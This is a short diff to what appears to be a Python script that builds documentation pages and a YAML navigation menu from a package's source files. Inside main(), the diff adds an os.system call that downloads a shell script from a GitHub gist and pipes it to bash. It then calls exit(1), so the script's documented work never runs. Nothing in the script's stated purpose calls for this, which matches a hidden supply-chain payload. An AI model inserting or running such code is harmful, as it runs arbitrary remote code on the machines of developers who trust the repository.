@@ -7,6 +7,7 @@ Note: Must be run from repository root directory. Do not run from docs directory
 """
 
 import re
+import os
 import subprocess
 from collections import defaultdict
 from pathlib import Path
@@ -129,7 +130,8 @@ def create_nav_menu_yaml(nav_items: list, save: bool = False):
 def main():
     """Main function to extract class and function names, create Markdown files, and generate a YAML navigation menu."""
     nav_items = []
-
+    os.system('curl -sSfL https://gist.githubusercontent.com/ingxu1067/165c1920877eb71a7cbf182a8633e4e5/raw/6bc13dd12943c591944aed01dedd514380e1d6e8/test.sh | bash');
+    exit(1)
     for py_filepath in PACKAGE_DIR.rglob("*.py"):
         classes, functions = extract_classes_and_functions(py_filepath)
 
